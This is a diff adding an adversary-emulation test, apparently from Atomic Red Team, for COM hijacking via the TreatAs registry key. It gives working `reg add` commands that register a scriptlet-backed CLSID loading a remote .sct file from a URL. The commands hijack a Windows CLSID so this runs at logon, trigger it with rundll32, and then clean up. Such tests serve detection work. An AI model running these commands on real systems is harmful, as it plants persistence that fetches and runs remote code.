@@ -95,3 +95,42 @@ atomic_tests:
     cleanup_command: |-
       Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore
     name: powershell
+- name: COM hijacking via TreatAs
+  auto_generated_guid: 33eacead-f117-4863-8eb0-5c6304fbfaa9
+  description: |-
+    This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.
+    Then, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The
+    test is validated by running 'rundll32.exe -sta "AtomicTest"' to avoid logging out.
+
+    References:
+
+    https://youtu.be/3gz1QmiMhss?t=1251
+
+    https://github.com/enigma0x3/windows-operating-system-archaeology
+
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d "AtomicTest" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\\WINDOWS\\system32\\scrobj.dll" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f
+
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
+      reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
+
+      rundll32.exe -sta "AtomicTest" 
+
+    cleanup_command: |-
+      reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /f
+      reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
+      reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
+    name: powershell
